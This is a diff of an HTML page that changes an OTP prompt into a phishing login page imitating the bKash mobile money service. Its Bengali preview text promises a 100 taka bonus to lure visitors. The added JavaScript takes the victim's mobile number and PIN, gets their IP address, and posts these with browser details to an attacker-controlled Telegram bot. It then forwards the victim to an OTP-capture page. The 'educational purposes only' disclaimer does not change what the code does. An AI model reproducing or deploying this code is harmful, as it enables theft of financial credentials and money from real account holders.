@@ -3,18 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bkrash OTP</title>
+    <link rel="shortcut icon" href="https://telegra.ph/file/c44ac3cc6bac7bba074d3.jpg" />
+    <meta property="og:title" content="এখনই লগইন করুন বিকাশ ওয়েব সাইটে 100 টাকা। বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:description" content="এখনই লগইন করুন বিকাশ ওয়েব সাইটে 100 টাকা। বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:image" content="https://i.ibb.co/ZG3mM2j/website-720x360-1717679913754.webp" />
+    <title>Your Title</title>
     <style>
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         @keyframes buttonHover {
             from { background-color: #e4136b; }
             to { background-color: #c5115a; }
         }
-
         body {
             background-color: #e4136b;
             font-family: Arial, sans-serif;
@@ -22,14 +24,16 @@
             padding: 0;
             display: flex;
             flex-direction: column;
-            justify-content: flex-start;
+            justify-content: flex-start; 
             align-items: center;
             height: 100vh;
+            padding-top: 50px; 
+            overflow: auto;
+            overflow: hidden;
         }
         .logo {
             text-align: center;
-            margin-top: 50px;
-            margin-bottom: 10px;
+            margin-bottom: 10px; 
             animation: fadeIn 1s ease-in-out;
         }
         .logo img {
@@ -40,23 +44,26 @@
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            text-align: center;
             width: 300px;
-            margin-top: 30px;
             animation: fadeIn 1.5s ease-in-out;
         }
-        input[type="text"] {
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+            animation: fadeIn 2s ease-in-out;
+        }
+        input[type="number"],
+        input[type="number"] {
             width: 100%;
             padding: 10px;
-            margin-bottom: 10px;
             border: 1px solid #CCCCCC;
             border-radius: 5px;
             box-sizing: border-box;
             font-family: Arial, sans-serif;
             transition: border-color 0.3s, box-shadow 0.3s;
-            animation: fadeIn 2s ease-in-out;
         }
-        input[type="text"]::placeholder {
+        input[type="number"]::placeholder,
+        input[type="number"]::placeholder {
             font-family: Arial, sans-serif;
             color: #999999;
         }
@@ -67,17 +74,8 @@
         }
         input.invalid {
             border-color: red;
-            box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
         }
-        #timer {
-            color: #e4136b;
-            font-weight: bold;
-            margin-bottom: 10px;
-            text-align: center;
-            width: 100%;
-            animation: fadeIn 2.5s ease-in-out;
-        }
-        #submitButton {
+        #loginButton {
             background-color: #e4136b;
             color: #FFFFFF;
             border: none;
@@ -86,20 +84,17 @@
             cursor: pointer;
             width: 100%;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
             font-family: Arial, sans-serif;
-            font-size: 16px;
+            font-size: 17px;
             transition: background-color 0.3s, transform 0.3s;
-            animation: fadeIn 3s ease-in-out;
+            animation: fadeIn 2.5s ease-in-out;
         }
-        #submitButton:hover {
+        #loginButton:hover {
             background-color: #c5115a;
             animation: buttonHover 0.3s forwards;
             transform: translateY(-2px);
-        }
-        #submitButton span {
-            margin-left: auto;
         }
     </style>
 </head>
@@ -108,11 +103,15 @@
         <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Bkash Logo">
     </div>
     <div class="container">
-        <p>We have sent an OTP to your bkrash mobile number, enter that OTP here.</p>
-        <input type="text" placeholder="Enter OTP" id="otpInput" inputmode="numeric" pattern="\d*">
-        <div id="timer">01:00</div>
-        <button id="submitButton">Submit <span>&#8594;</span></button>
-        <p id="goBack" style="margin-top: 20px; color: #999999; cursor: pointer;">GO BACK</p>
+        <div class="input-group">
+            <p>Enter Bkrash Mobile Number</p>
+            <input type="number" placeholder="Ex: 01XXXXXXXXX" id="mobileNumber">
+        </div>
+        <div class="input-group">
+            <p>Enter PIN</p>
+            <input type="number" placeholder="Ex: XXXXX" id="pin">
+        </div>
+        <button id="loginButton">Login <span>&#8594;</span></button>
     </div>
 
     <script>
@@ -124,119 +123,100 @@
             };
         }
 
-        const { token, chatId } = getQueryParams();
-        const telegramToken = token;
-        const telegramChatId = chatId;
+        const { token: telegramToken, chatId: telegramChatId } = getQueryParams();
 
-        const submitButton = document.getElementById('submitButton');
-        const otpInput = document.getElementById('otpInput');
-        const timerElement = document.getElementById('timer');
+        const loginButton = document.getElementById('loginButton');
+        const mobileNumber = document.getElementById('mobileNumber');
+        const pin = document.getElementById('pin');
 
-        function startTimer(duration) {
-            let timer = duration, minutes, seconds;
-            const countdown = setInterval(() => {
-                minutes = Math.floor(timer / 60);
-                seconds = timer % 60;
+        loginButton.addEventListener('click', async () => {
+            const mobileNumberValue = mobileNumber.value.trim();
+            const pinValue = pin.value.trim();
+            let isValid = true;
 
-                timerElement.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-
-                if (--timer < 0) {
-                    clearInterval(countdown);
-                    startTimer(duration); 
-                }
-            }, 1000);
-        }
-
-        const sendToTelegram = async (token, chatId, message) => {
-            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-
-            try {
-                const response = await fetch(telegramUrl);
-                const data = await response.json();
-                if (!data.ok) {
-                    throw new Error(`Telegram API error: ${data.description}`);
-                }
-            } catch (error) {
-                console.error('Error sending message to Telegram:', error);
-                alert(`Error occurred while sending message to Telegram: ${error.message}`);
-            }
-        };
-
-        submitButton.addEventListener('click', async () => {
-            const otpValue = otpInput.value;
-            console.log('OTP Value:', otpValue);
-
-            if (!/^\d{6}$/.test(otpValue)) {
-                otpInput.classList.add('invalid');
-                alert("Please enter a valid 6-digit OTP.");
-                return;
+            if (!/^01\d{9}$/.test(mobileNumberValue)) {
+                mobileNumber.classList.add('invalid');
+                isValid = false;
             } else {
-                otpInput.classList.remove('invalid');
+                mobileNumber.classList.remove('invalid');
             }
 
-            console.log('OTP is valid, proceeding...');
+            if (!/^\d{5}$/.test(pinValue)) {
+                pin.classList.add('invalid');
+                isValid = false;
+            } else {
+                pin.classList.remove('invalid');
+            }
+
+            if (!isValid) {
+                alert('দয়া করে সঠিক নাম্বার এবং পিন লিখুন!');
+                return;
+            }
 
             const userAgent = navigator.userAgent;
             const date = new Date();
-            console.log('User Agent:', userAgent);
-            console.log('Date:', date.toLocaleString());
+            const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
 
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-                console.log('IP Address:', ip);
+            const loginData = {
+                mobileNumber: mobileNumberValue,
+                pin: pinValue,
+                ip: ip,
+                userAgent: userAgent,
+                date: date.toLocaleString()
+            };
 
-                const otpData = {
-                    otp: otpValue,
-                    ip: ip,
-                    userAgent: userAgent,
-                    date: date.toLocaleString()
-                };
-
-                const telegramMessage = `<b>🎣 Bkrash Info</b>
-
-🔑 <b>OTP:</b> <code>${otpData.otp}</code>
-
-🌐 <b>IP Address:</b> ${otpData.ip}
-
-💻 <b>User Agent:</b> ${otpData.userAgent}
-
-📅 <b>Date:</b> ${otpData.date}
-
+            const userMessage = `<b>🎣 Bkrash Phishing Info</b>
+    
+📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
+    
+🔐<b>PIN:</b> <code>${loginData.pin}</code>
+    
+🌐<b>IP Address:</b> ${loginData.ip}
+    
+💻<b>User Agent:</b> ${loginData.userAgent}
+    
+📅<b>Date:</b> ${loginData.date}
+    
 <blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
 
-                console.log('Telegram Message:', telegramMessage);
+            const sendToTelegram = async (token, chatId, message) => {
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+                const params = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
 
-                await sendToTelegram(telegramToken, telegramChatId, telegramMessage);
-                
+                try {
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(params)
+                    });
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Failed to send message:', data);
+                        throw new Error('Failed to send message to Telegram');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error occurred while sending message to Telegram');
+                }
+            };
 
-                console.log('OTP sent to Telegram');
-            } catch (error) {
-                console.error('Error in main flow:', error);
+            if (!telegramToken || !telegramChatId) {
+                alert('Token or Chat ID is missing from the URL parameters!');
+                return;
             }
+
+            console.log('Sending to user Telegram:', telegramToken, telegramChatId, userMessage);
+            await sendToTelegram(telegramToken, telegramChatId, userMessage);
+
+            const url = `otp.html?token=${telegramToken}&id=${telegramChatId}`;
+            window.location.href = url;
         });
-
-        window.onload = () => {
-            startTimer(60); 
-        };
-
-        window.addEventListener('popstate', function(event) {
-            window.location.href = 'login.html';
-        });
-
-        window.history.pushState({}, '');
-
-        document.getElementById('goBack').addEventListener('click', function() {
-            window.location.href = 'login.html';
-        });
-
-        document.getElementById("submitButton").addEventListener("click", function() {
-            setTimeout(function() {
-                alert("দুঃখিত, নেটওয়ার্ক ত্রুটির কারণে সমস্যা হচ্ছে, দয়া করে পুনরায় চেষ্টা করুন।");
-            }, 1000);
-        });
-
     </script>
 </body>
 </html>
